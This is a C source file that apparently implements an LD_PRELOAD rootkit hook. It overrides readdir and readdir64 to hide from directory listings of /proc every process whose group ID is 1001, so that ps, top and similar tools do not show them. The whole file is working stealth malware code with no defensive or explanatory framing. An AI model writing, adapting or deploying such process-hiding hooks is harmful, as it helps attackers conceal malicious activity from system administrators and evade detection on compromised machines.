#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>

#define HIDDEN_GID 1001

static struct dirent* (*original_readdir)(DIR*) = NULL;
static struct dirent64* (*original_readdir64)(DIR*) = NULL;

static int is_all_digits(const char* str) {
    for (; *str; str++) {
        if (!isdigit(*str)) return 0;
    }
    return 1;
}

static gid_t get_process_gid(pid_t pid) {
    char path[256];
    FILE* f;
    gid_t gid = -1;
    char line[256];
    
    snprintf(path, sizeof(path), "/proc/%d/status", pid);
    f = fopen(path, "r");
    if (!f) return -1;

    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "Gid:", 4) == 0) {
            sscanf(line + 4, "%*s%d", &gid);
            break;
        }
    }
    
    fclose(f);
    return gid;
}

struct dirent* readdir(DIR* dirp) {
    original_readdir = original_readdir ? original_readdir : dlsym(RTLD_NEXT, "readdir");
    
    struct dirent* entry;
    while ((entry = original_readdir(dirp))) {
        if (!is_all_digits(entry->d_name)) return entry;
        
        pid_t pid = atoi(entry->d_name);
        gid_t current_gid = get_process_gid(pid);
        if (current_gid != HIDDEN_GID) return entry;
    }
    return NULL;
}

struct dirent64* readdir64(DIR* dirp) {
    original_readdir64 = original_readdir64 ? original_readdir64 : dlsym(RTLD_NEXT, "readdir64");
    
    struct dirent64* entry;
    while ((entry = original_readdir64(dirp))) {
        if (!is_all_digits(entry->d_name)) return entry;
        
        pid_t pid = atoi(entry->d_name);
        gid_t current_gid = get_process_gid(pid);
        if (current_gid != HIDDEN_GID) return entry;
    }
    return NULL;
}